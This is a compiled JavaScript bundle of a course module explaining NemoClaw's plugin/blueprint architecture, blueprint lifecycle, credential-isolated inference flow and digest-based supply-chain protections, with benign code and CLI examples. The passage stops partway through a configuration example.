import{j as e}from"./vendor-ui-D7_WPSYG.js";import{A as c,C as t,D as a,a as i,N as n,R as s,S as l,W as o,E as r,P as d}from"./subject-01-5wdxj4WZ.js";import"./vendor-react-DsRxi-pb.js";const _={id:"03-nemoclaw-architecture",title:"NemoClaw Architecture & Core Concepts",icon:"🏗️",colorHex:"#FF6600",description:"Deep dive into NemoClaw's two-component design, OpenShell runtime, blueprint model, and inference provider system.",difficulty:"intermediate",estimatedHours:6,prerequisites:["01-foundations","02-openclaw"],chapters:[{id:"c1-architecture",title:"NemoClaw Architecture",description:"Plugin-blueprint split, lifecycle stages, inference flow, and supply chain safety.",estimatedMinutes:55,sections:[{id:"s1-two-component-design",title:"Two-Component Design",difficulty:"intermediate",readingMinutes:12,description:"TypeScript plugin and Python blueprint separation."},{id:"s2-blueprint-lifecycle",title:"Blueprint Lifecycle",difficulty:"intermediate",readingMinutes:15,description:"Five stages: Resolve, Verify, Plan, Apply, Status."},{id:"s3-inference-flow",title:"Inference Flow",difficulty:"intermediate",readingMinutes:12,description:"Request journey from sandbox through gateway to NVIDIA endpoint."},{id:"s4-supply-chain-safety",title:"Supply Chain Safety",difficulty:"intermediate",readingMinutes:12,description:"Immutable blueprints and digest verification."}]},{id:"c2-openshell",title:"NVIDIA OpenShell Runtime",description:"The sandbox runtime powering NemoClaw's isolation.",estimatedMinutes:70,sections:[{id:"s1-what-is-openshell",title:"What is OpenShell?",difficulty:"intermediate",readingMinutes:10,description:"Overview and comparison with traditional containers."},{id:"s2-landlock-enforcement",title:"Landlock LSM Enforcement",difficulty:"intermediate",readingMinutes:15,description:"Kernel-level filesystem access control."},{id:"s3-seccomp-filters",title:"Seccomp Filters",difficulty:"intermediate",readingMinutes:15,description:"System call filtering and privilege escalation prevention."},{id:"s4-network-namespaces",title:"Network Namespace Isolation",difficulty:"intermediate",readingMinutes:15,description:"veth pairs, endpoint whitelisting, and DNS control."},{id:"s5-openshell-tui",title:"The OpenShell TUI",difficulty:"beginner",readingMinutes:10,description:"Terminal UI for monitoring and operator approval."}]},{id:"c3-plugin-blueprint",title:"The Plugin-Blueprint Model",description:"How the thin plugin and versioned blueprint work together.",estimatedMinutes:50,sections:[{id:"s1-plugin-internals",title:"Plugin Internals",difficulty:"intermediate",readingMinutes:12,description:"Provider registration, slash command handler, and IPC."},{id:"s2-blueprint-versioning",title:"Blueprint Versioning",difficulty:"intermediate",readingMinutes:12,description:"Semver, version pinning, and upgrade workflows."},{id:"s3-thin-plugin-philosophy",title:"Thin Plugin Philosophy",difficulty:"intermediate",readingMinutes:10,description:"Why keeping the plugin thin improves security and maintainability."},{id:"s4-reproducible-environments",title:"Reproducible Environments",difficulty:"intermediate",readingMinutes:12,description:"How identical blueprints and policies ensure consistency."}]},{id:"c4-inference",title:"Inference Providers",description:"Configuring NVIDIA, OpenAI, Anthropic, Google, and local inference.",estimatedMinutes:75,sections:[{id:"s1-nvidia-nemotron",title:"NVIDIA Nemotron (Default)",difficulty:"beginner",readingMinutes:10,description:"Default provider setup via build.nvidia.com."},{id:"s2-openai-anthropic",title:"OpenAI & Anthropic",difficulty:"beginner",readingMinutes:12,description:"Configuring third-party cloud providers."},{id:"s3-google-gemini",title:"Google Gemini",difficulty:"beginner",readingMinutes:10,description:"Gemini setup and use cases."},{id:"s4-local-inference",title:"Local Inference (Ollama, vLLM)",difficulty:"intermediate",readingMinutes:15,description:"Running models locally with Ollama and vLLM."},{id:"s5-custom-endpoints",title:"Custom Endpoints",difficulty:"intermediate",readingMinutes:12,description:"OpenAI-compatible and custom provider configuration."},{id:"s6-credential-isolation",title:"Credential Isolation",difficulty:"intermediate",readingMinutes:12,description:"How API keys stay on the host and never enter the sandbox."}]}]};function p(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"The Two-Component Design"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["NemoClaw is not a single monolithic binary. It is deliberately split into two independent components that communicate over IPC: a ",e.jsx("strong",{children:"TypeScript Plugin"})," that lives inside OpenClaw, and a ",e.jsx("strong",{children:"Python Blueprint"})," that manages everything outside the editor. Understanding why this separation exists -- and what each half is responsible for -- is fundamental to working with NemoClaw effectively."]}),e.jsx(c,{title:"NemoClaw Two-Component Architecture",components:[{name:"OpenClaw Editor",description:"IDE / code editor",color:"blue"},{name:"TypeScript Plugin",description:"Thin integration layer",color:"green"},{name:"Python Blueprint",description:"Versioned orchestration engine",color:"purple"},{name:"OpenShell Sandbox",description:"Isolated execution environment",color:"orange"},{name:"Inference Provider",description:"LLM endpoint (NVIDIA, OpenAI, etc.)",color:"red"}],connections:[{from:"OpenClaw Editor",to:"TypeScript Plugin",label:"extension host"},{from:"TypeScript Plugin",to:"Python Blueprint",label:"IPC (JSON-RPC)"},{from:"Python Blueprint",to:"OpenShell Sandbox",label:"lifecycle mgmt"},{from:"Python Blueprint",to:"Inference Provider",label:"credential-bearing requests"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The TypeScript Plugin"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["The TypeScript plugin is intentionally ",e.jsx("em",{children:"thin"}),". It runs inside the OpenClaw extension host process and does exactly two things:"]}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Registers an inference provider"})," -- this is how OpenClaw learns that NemoClaw can route LLM requests. When a user or agent asks for a completion, OpenClaw calls the registered provider, and the plugin forwards the request to the blueprint over IPC."]}),e.jsxs("li",{children:[e.jsxs("strong",{children:["Adds the ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/nemoclaw"})," slash command"]})," -- this gives users a direct way to interact with NemoClaw from the editor command palette. Commands like",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/nemoclaw status"})," and",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/nemoclaw apply"})," are dispatched through the plugin to the blueprint."]})]}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["The plugin does ",e.jsx("em",{children:"not"})," manage sandboxes, parse policies, verify blueprint digests, or hold API credentials. It is a pass-through layer. This deliberate thinness is a design philosophy covered in depth in a later section."]}),e.jsx(t,{title:"Plugin registration (simplified)",language:"javascript",code:`// Inside the OpenClaw extension host
export function activate(context) {
  // 1. Register the inference provider
  const provider = new NemoClawInferenceProvider();
  context.subscriptions.push(
    openclaw.lm.registerChatModelProvider('nemoclaw', provider)
  );

  // 2. Register the /nemoclaw slash command
  context.subscriptions.push(
    openclaw.commands.registerCommand('nemoclaw.slash', handleSlashCommand)
  );
}`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The Python Blueprint"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The Python blueprint is the brain of NemoClaw. It is a versioned, independently released package that handles all of the heavy lifting:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Sandbox orchestration"})," -- creating, configuring, and tearing down OpenShell sandboxes according to the user's policy files."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Policy enforcement"})," -- reading YAML policy definitions, computing the desired state, and applying Landlock, seccomp, and network namespace rules."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Inference routing"})," -- receiving inference requests from the plugin, attaching the appropriate host-side credentials, and forwarding them to the configured LLM endpoint (NVIDIA, OpenAI, Anthropic, local, etc.)."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Digest verification"})," -- ensuring its own integrity by checking cryptographic digests before execution, preventing supply-chain tampering."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Health reporting"})," -- exposing status information about sandbox health, policy compliance, and inference connectivity."]})]}),e.jsx(a,{term:"Blueprint",definition:"In NemoClaw, a blueprint is the versioned Python package that contains all orchestration logic. It is the authoritative source of truth for how sandboxes are configured and how policies are enforced. Blueprints are immutable once released and are verified by cryptographic digest before use.",example:"nemoclaw-blueprint v0.8.2 -- contains the logic for Landlock rule generation, seccomp filter compilation, and inference routing for all supported providers.",seeAlso:["Digest Verification","Immutable Release","Supply Chain Safety"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Why This Split?"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["The two-component split is not an accident of implementation -- it is a deliberate architectural decision driven by two requirements: ",e.jsx("strong",{children:"independent evolution"})," and",e.jsx("strong",{children:"supply chain safety"}),"."]}),e.jsx(i,{title:"Plugin vs. Blueprint Responsibilities",headers:["Concern","TypeScript Plugin","Python Blueprint"],rows:[["Release cadence","Rare (editor API changes only)","Frequent (new features, providers, policies)"],["Language","TypeScript","Python"],["Runs inside","OpenClaw extension host","Standalone process on host"],["Has credentials","No","Yes (host-side only)"],["Manages sandbox","No","Yes"],["Verified by digest","No (standard extension signing)","Yes (cryptographic digest)"],["Size","~200 lines","~15,000+ lines"]],highlightDiffs:!0}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"Independent Evolution"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"OpenClaw's extension API changes infrequently. When it does, only the thin plugin needs to be updated. Meanwhile, the blueprint -- which contains all the complex orchestration logic -- can release new versions on its own cadence without requiring a new extension release, an OpenClaw restart, or marketplace review. This means security patches, new inference provider support, and policy improvements can ship in hours rather than days."}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"Supply Chain Safety"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When an autonomous agent is running inside a sandbox, the integrity of the orchestration layer is critical. If an attacker could tamper with the blueprint, they could weaken sandbox policies, exfiltrate credentials, or redirect inference requests. By keeping the blueprint as a standalone, digest-verified artifact, NemoClaw ensures that the orchestration logic can be independently audited and cryptographically verified before every use."}),e.jsx(n,{type:"important",title:"Security Boundary",children:"The plugin runs inside OpenClaw's extension host, which is a relatively trusted environment. The blueprint runs on the host but manages an untrusted sandbox. This boundary is critical: credentials live on the host side (in the blueprint), never inside the sandbox. The two-component design enforces this boundary at the architecture level, not just by convention."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Communication: IPC via JSON-RPC"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The plugin and blueprint communicate over a local IPC channel using JSON-RPC. The plugin sends structured requests (inference completions, status queries, apply commands) and receives structured responses. This protocol is intentionally simple and stateless from the plugin's perspective -- all state lives in the blueprint process."}),e.jsx(t,{title:"Example JSON-RPC message flow",language:"json",code:`// Plugin -> Blueprint (request)
{
  "jsonrpc": "2.0",
  "method": "inference.complete",
  "params": {
    "model": "nvidia/nemotron-3-super-120b",
    "messages": [
      { "role": "user", "content": "Explain Landlock LSM" }
    ]
  },
  "id": 42
}

// Blueprint -> Plugin (response)
{
  "jsonrpc": "2.0",
  "result": {
    "content": "Landlock is a Linux Security Module...",
    "usage": { "prompt_tokens": 12, "completion_tokens": 87 }
  },
  "id": 42
}`}),e.jsx(n,{type:"tip",title:"Mental Model",children:"Think of the TypeScript plugin as a remote control and the Python blueprint as the appliance. The remote control has buttons (slash commands, provider registration) but no logic of its own. The appliance does all the real work and can be upgraded independently of the remote."}),e.jsx(s,{references:[{title:"NemoClaw Architecture Overview",url:"https://docs.nvidia.com/nemoclaw/architecture",type:"docs",description:"Official documentation on the two-component design and IPC protocol."},{title:"NemoClaw GitHub Repository",url:"https://github.com/NVIDIA/NemoClaw",type:"github",description:"Source code for both the TypeScript plugin and Python blueprint."}]})]})}const M=Object.freeze(Object.defineProperty({__proto__:null,default:p},Symbol.toStringTag,{value:"Module"}));function h(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Blueprint Lifecycle"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Every time NemoClaw starts or applies a configuration change, the Python blueprint goes through a well-defined lifecycle of five stages. Each stage has a clear responsibility, clear failure modes, and clear outputs. Understanding this lifecycle is essential for debugging, for writing custom policies, and for understanding why NemoClaw behaves the way it does."}),e.jsx(l,{title:"The Five Lifecycle Stages",steps:[{title:"Stage 1: Resolve",content:`Find the correct blueprint version. NemoClaw reads the user's configuration to determine which blueprint version is requested (e.g., "0.8.2" or "latest"). It checks the local cache first, then pulls from the configured registry if needed. Resolution also considers version pinning and constraints specified in the project's .nemoclaw/config.yaml file.`,code:`# Resolution reads from .nemoclaw/config.yaml
blueprint:
  version: "0.8.2"          # Exact pin
  # version: ">=0.8,<0.9"   # Range constraint
  registry: "https://registry.nvidia.com/nemoclaw"`,language:"yaml"},{title:"Stage 2: Verify",content:"Check the integrity of the resolved blueprint. NemoClaw computes the SHA-256 digest of the blueprint package and compares it against the expected digest published in the registry manifest. If the digest does not match, the lifecycle halts immediately with an error. This prevents execution of tampered or corrupted blueprints.",code:`$ nemoclaw blueprint verify
Verifying blueprint v0.8.2...
  Expected digest: sha256:a3f8c1d...e9b7
  Computed digest: sha256:a3f8c1d...e9b7
  Status: VERIFIED`,language:"bash"},{title:"Stage 3: Plan",content:"Compute the desired state. The blueprint reads all policy files (.nemoclaw/policies/*.yaml), the project configuration, and the current system state. It produces a plan -- a declarative description of what the sandbox should look like: which filesystem paths are accessible, which syscalls are allowed, which network endpoints are reachable, and which inference provider is configured.",code:`$ nemoclaw plan
Planning sandbox configuration...
  Filesystem: /sandbox (rw), /tmp (rw), /usr (ro), /lib (ro)
  Seccomp: 58 syscalls allowed, 284 blocked
  Network: inference.local:443, pypi.org:443 (via proxy)
  Inference: nvidia/nemotron-3-super-120b
  Changes from current state: 2 new network rules, 1 updated fs rule`,language:"bash"},{title:"Stage 4: Apply",content:"Create (or reconfigure) the sandbox to match the plan. This is where OpenShell is invoked. The blueprint passes the computed Landlock rules, seccomp filters, and network namespace configuration to OpenShell, which creates the isolated environment. If a sandbox already exists, Apply performs a minimal diff-based update rather than a full teardown and rebuild.",code:`$ nemoclaw apply
Applying plan...
  Creating OpenShell sandbox... done
  Applying Landlock rules (12 paths)... done
  Loading seccomp filter (58 allowed syscalls)... done
  Configuring network namespace... done
  Starting inference.local gateway... done
  Sandbox ready in 1.2s`,language:"bash"},{title:"Stage 5: Status",content:"Report the health of the running sandbox. After Apply completes (and periodically thereafter), the blueprint checks that the sandbox is healthy: the agent process is running, the Landlock rules are in effect, the seccomp filter is loaded, and the inference gateway is responding. Status is exposed via the plugin to the OpenClaw UI and via the openshell term TUI.",code:`$ nemoclaw status
NemoClaw Status:
  Blueprint: v0.8.2 (verified)
  Sandbox:   running (pid 4821, uptime 14m)
  Landlock:  enforcing (12 rules)
  Seccomp:   enforcing (58/342 syscalls allowed)
  Network:   2 endpoints reachable
  Inference: nvidia/nemotron-3-super-120b (latency: 142ms)
  Health:    OK`,language:"bash"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Lifecycle as a Loop"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The lifecycle is not just a one-time startup sequence. It operates as a reconciliation loop, similar to a Kubernetes controller. When policies change on disk, the blueprint detects the change through filesystem watching and re-runs the Plan and Apply stages. This means you can edit a policy file, save it, and see the sandbox reconfigure itself within seconds -- without restarting anything."}),e.jsx(t,{title:"Reconciliation loop (conceptual)",language:"python",code:`class BlueprintController:
    async def reconcile(self):
        """Main reconciliation loop."""
        while True:
            version = await self.resolve()      # Stage 1
            self.verify(version)                 # Stage 2
            plan = self.plan(version)            # Stage 3
            if plan.has_changes():
                await self.apply(plan)           # Stage 4
            self.report_status()                 # Stage 5
            await self.wait_for_change()         # Watch for policy/config changes`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Failure Handling at Each Stage"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Each stage has distinct failure modes, and NemoClaw is designed to fail loudly and early rather than silently degrading security:"}),e.jsx(a,{term:"Resolve Failure",definition:"Occurs when the requested blueprint version cannot be found in the local cache or the remote registry. Common causes: version typo, network issue, or registry downtime.",example:"Error: Blueprint version 0.8.3 not found. Available versions: 0.8.0, 0.8.1, 0.8.2."}),e.jsx(a,{term:"Verify Failure",definition:"Occurs when the computed digest does not match the expected digest. This is a hard stop -- NemoClaw will not proceed. This could indicate a corrupted download, a cache poisoning attack, or a registry compromise.",example:"FATAL: Digest mismatch for blueprint v0.8.2. Expected sha256:a3f8c1d...e9b7, got sha256:7b2e4f9...c3a1. Refusing to execute."}),e.jsx(o,{title:"Never Ignore Verify Failures",children:"A digest mismatch is a security event. Do not work around it by disabling verification. Investigate the cause: re-download the blueprint, check your registry configuration, and if the mismatch persists, report it to your security team. Tampered blueprints could weaken every sandbox policy."}),e.jsx(a,{term:"Plan Failure",definition:"Occurs when policy files contain syntax errors, reference unsupported features, or produce contradictory rules. The plan stage validates the entire configuration before any changes are applied.",example:"Error in policies/network.yaml line 12: endpoint 'evil.example.com' does not match any allowlist pattern."}),e.jsx(a,{term:"Apply Failure",definition:"Occurs when the host system cannot satisfy the plan. Common causes: missing kernel features (Landlock not available), insufficient permissions, or resource exhaustion.",example:"Error: Landlock ABI v3 required but host kernel only supports ABI v1. Upgrade to kernel 6.2+ or adjust policies."}),e.jsx(a,{term:"Status Failure",definition:"Occurs when the sandbox is running but unhealthy. The agent process may have crashed, the inference gateway may be unreachable, or a Landlock rule may have been unexpectedly removed (which should not happen under normal operation).",example:"Warning: Inference gateway not responding. Last successful health check: 2m ago."}),e.jsxs(n,{type:"tip",title:"Debugging Tip",children:["Run ",e.jsx("code",{children:"nemoclaw status --verbose"})," to see which lifecycle stage last ran, how long each stage took, and whether any warnings were produced. This is the single most useful command when something is not working as expected."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Idempotency"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Every stage is designed to be idempotent. Running ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"nemoclaw apply"})," twice with the same configuration produces the same result. The Plan stage computes a diff against the current state, and if there are no changes, Apply is a no-op. This is important both for reliability (re-running after a partial failure is safe) and for the reconciliation loop (spurious filesystem events do not cause unnecessary sandbox churn)."]}),e.jsx(s,{references:[{title:"NemoClaw Blueprint Lifecycle",url:"https://docs.nvidia.com/nemoclaw/lifecycle",type:"docs",description:"Detailed documentation on each lifecycle stage, including error codes and recovery procedures."},{title:"Kubernetes Controller Pattern",url:"https://kubernetes.io/docs/concepts/architecture/controller/",type:"docs",description:"The reconciliation loop pattern that inspired NemoClaw's lifecycle design."}]})]})}const R=Object.freeze(Object.defineProperty({__proto__:null,default:h},Symbol.toStringTag,{value:"Module"}));function m(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Inference Flow"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When an agent running inside a NemoClaw sandbox needs to call an LLM, the request does not go directly to the internet. Instead, it follows a carefully designed path that keeps API credentials outside the sandbox while still giving the agent seamless access to inference. This section traces the full journey of an inference request from the agent to the LLM endpoint and back."}),e.jsx(c,{title:"Inference Request Flow",components:[{name:"Agent (in Sandbox)",description:"Makes inference request",color:"orange"},{name:"OpenShell Gateway",description:"Intercepts & routes traffic",color:"blue"},{name:"inference.local",description:"Virtual host inside sandbox",color:"green"},{name:"Blueprint (Host)",description:"Attaches credentials",color:"purple"},{name:"build.nvidia.com",description:"NVIDIA inference endpoint",color:"red"}],connections:[{from:"Agent (in Sandbox)",to:"inference.local",label:"HTTP request (no creds)"},{from:"inference.local",to:"OpenShell Gateway",label:"network namespace bridge"},{from:"OpenShell Gateway",to:"Blueprint (Host)",label:"IPC"},{from:"Blueprint (Host)",to:"build.nvidia.com",label:"HTTPS + API key"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Step-by-Step: The Request Journey"}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"1. Agent Makes a Request"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Inside the sandbox, the agent (or any tool it invokes) sends an HTTP POST request to ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"https://inference.local/v1/chat/completions"}),". This looks like a standard OpenAI-compatible API call. The agent does not need to know which provider is actually configured -- it always talks to the same local endpoint."]}),e.jsx(t,{title:"Agent-side inference request",language:"python",code:`import httpx

# Inside the sandbox, the agent talks to inference.local
response = httpx.post(
    "https://inference.local/v1/chat/completions",
    json={
        "model": "nvidia/nemotron-3-super-120b",
        "messages": [
            {"role": "system", "content": "You are a helpful coding assistant."},
            {"role": "user", "content": "Write a Python function to parse YAML."}
        ],
        "temperature": 0.7
    }
    # Note: NO Authorization header, NO API key
)`}),e.jsx(a,{term:"inference.local",definition:"A virtual hostname that resolves only inside a NemoClaw sandbox. It points to the OpenShell gateway's listening socket within the sandbox's network namespace. The agent treats it as a regular HTTPS endpoint, but the traffic never leaves the host machine unencrypted.",example:"curl https://inference.local/v1/models -- lists available models from inside the sandbox.",seeAlso:["OpenShell Gateway","Network Namespace","Credential Isolation"]}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"2. OpenShell Gateway Intercepts"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["The sandbox runs inside its own network namespace. The only way traffic can leave the sandbox is through the OpenShell gateway, which listens on the sandbox-side network interface. When the gateway receives the request to",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"inference.local"}),", it does not forward it blindly. Instead, it:"]}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsx("li",{children:"Validates that the request matches the expected inference API schema"}),e.jsx("li",{children:"Checks that the requested model is in the allowlist defined by the active policy"}),e.jsx("li",{children:"Strips any headers that might have been injected by the agent"}),e.jsx("li",{children:"Forwards the sanitized request body to the blueprint process via IPC"})]}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"3. Blueprint Attaches Credentials"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The blueprint process runs on the host, outside the sandbox. It receives the sanitized inference request from the gateway and performs the critical credential injection step:"}),e.jsx(t,{title:"Blueprint credential injection (conceptual)",language:"python",code:`class InferenceRouter:
    async def handle_request(self, sanitized_request: dict) -> dict:
        # Load credentials from host-side secure storage
        api_key = self.credential_store.get("nvidia_api_key")
        endpoint = self.config.inference_endpoint  # e.g., build.nvidia.com

        # Forward with credentials attached
        response = await self.http_client.post(
            f"https://{endpoint}/v1/chat/completions",
            json=sanitized_request,
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json"
            }
        )

        # Strip any sensitive headers from the response
        return self.sanitize_response(response.json())`}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"4. Response Returns"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The LLM endpoint returns its response to the blueprint. The blueprint sanitizes the response (removing any headers that might leak information about the host-side configuration), then sends it back through the gateway into the sandbox. The agent receives a standard OpenAI-compatible response as if it had called the API directly."}),e.jsx(t,{title:"Response as seen by the agent",language:"json",code:`{
  "id": "chatcmpl-abc123",
  "object": "chat.completion",
  "model": "nvidia/nemotron-3-super-120b",
  "choices": [
    {
      "index": 0,
      "message": {
        "role": "assistant",
        "content": "Here's a YAML parsing function:\\n\\nimport yaml\\n..."
      },
      "finish_reason": "stop"
    }
  ],
  "usage": {
    "prompt_tokens": 31,
    "completion_tokens": 142,
    "total_tokens": 173
  }
}`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Why Credentials Never Enter the Sandbox"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"This architecture ensures that even if the agent is compromised -- if it executes malicious code, if a prompt injection succeeds, if a dependency is backdoored -- the API credentials remain safe. The agent has no way to extract them because they simply do not exist inside the sandbox's filesystem, environment variables, or memory space. The credentials only exist in the blueprint process, which runs in a separate process on the host with its own memory space."}),e.jsxs(o,{title:"Common Misconception",children:["Some developers assume that environment variables set on the host are available inside the sandbox. They are not. OpenShell creates a clean environment. The only way data enters the sandbox is through explicitly configured mount points and the network namespace bridge. API keys in your shell's ",e.jsx("code",{children:"~/.bashrc"})," are invisible to sandboxed processes."]}),e.jsx(n,{type:"info",title:"Latency Considerations",children:"The extra hop through the gateway and blueprint adds approximately 2-5ms of latency per request on a typical system. This is negligible compared to the 100-500ms typical LLM inference time. The security benefit far outweighs this cost. If you are using local inference (Ollama, vLLM), the added latency is even less significant since the total round-trip is shorter."}),e.jsx(r,{question:"Why does the agent send requests to inference.local instead of directly to build.nvidia.com?",options:["inference.local is faster because it caches responses","The sandbox network namespace blocks direct internet access, and inference.local routes through the credential-injecting gateway","inference.local is just an alias for build.nvidia.com in /etc/hosts","The agent does not have DNS resolution capability"],correctIndex:1,explanation:"The sandbox runs in an isolated network namespace with no direct internet access. inference.local is a virtual endpoint that routes through the OpenShell gateway, which forwards requests to the blueprint for credential injection. This ensures API keys never exist inside the sandbox."}),e.jsx(s,{references:[{title:"NemoClaw Inference Architecture",url:"https://docs.nvidia.com/nemoclaw/inference",type:"docs",description:"Official documentation on inference routing, credential isolation, and supported providers."},{title:"OpenShell Network Namespace Design",url:"https://docs.nvidia.com/openshell/networking",type:"docs",description:"How OpenShell implements network isolation and the gateway bridge."}]})]})}const E=Object.freeze(Object.defineProperty({__proto__:null,default:m},Symbol.toStringTag,{value:"Module"}));function u(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Supply Chain Safety"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Autonomous agents amplify supply chain risk. A human developer who installs a compromised package might notice something odd. An agent executing autonomously inside a sandbox cannot exercise that judgment. If the orchestration layer itself is compromised -- if the blueprint that configures the sandbox has been tampered with -- the entire security model collapses. NemoClaw addresses this with immutable blueprints and cryptographic digest verification."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The Threat Model"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Consider what an attacker could achieve by tampering with a NemoClaw blueprint:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Weaken sandbox policies"})," -- open additional filesystem paths, allow dangerous syscalls, or add network endpoints to the allowlist"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Exfiltrate credentials"})," -- modify the inference routing to send API keys to an attacker-controlled endpoint"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Inject code"})," -- add malicious logic that runs during sandbox setup, with host-level privileges"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Redirect inference"})," -- route inference requests to a malicious endpoint that returns poisoned completions"]})]}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["These attacks are particularly dangerous because they are ",e.jsx("em",{children:"invisible"})," to the agent and to the user. The sandbox appears to be working normally, but its security guarantees have been silently removed."]}),e.jsx(o,{title:"Why This Matters More for Agents",children:"A human developer who SSH-es into a server can notice if something feels wrong. An autonomous agent running a multi-hour task inside a sandbox has no such intuition. It will faithfully execute whatever the orchestration layer tells it to do. If that orchestration layer has been compromised, the agent becomes a tool for the attacker."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Immutable Blueprints"}),e.jsx(a,{term:"Immutable Blueprint",definition:"Once a blueprint version is published to the registry, its contents cannot be changed. There is no mechanism for overwriting a version. If a bug is found, a new version must be published. This is enforced at the registry level -- the registry rejects uploads to existing version numbers.",example:"Blueprint v0.8.2 was published on 2025-11-15. To fix a bug in v0.8.2, the team must publish v0.8.3. Version 0.8.2 will always contain exactly the same bytes, forever.",seeAlso:["Semantic Versioning","Digest Verification","Registry"]}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Immutability alone does not prevent attacks -- it just prevents ",e.jsx("em",{children:"silent modification"})," of already-released versions. An attacker who compromises the registry could still publish a malicious version with a new number. That is where digest verification comes in."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Digest Verification"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Every published blueprint has an associated SHA-256 digest that is computed from the entirety of the package contents. This digest is stored in multiple places: the registry manifest, the NemoClaw documentation, and (for critical versions) signed by NVIDIA's release key. Before NemoClaw executes a blueprint, it recomputes the digest and compares it to the expected value."}),e.jsx(l,{title:"Digest Verification Process",steps:[{title:"Fetch the expected digest",content:"NemoClaw retrieves the expected digest from the registry manifest. For pinned versions, the digest can also be specified directly in the project configuration.",code:`# .nemoclaw/config.yaml -- optional digest pinning
blueprint:
  version: "0.8.2"
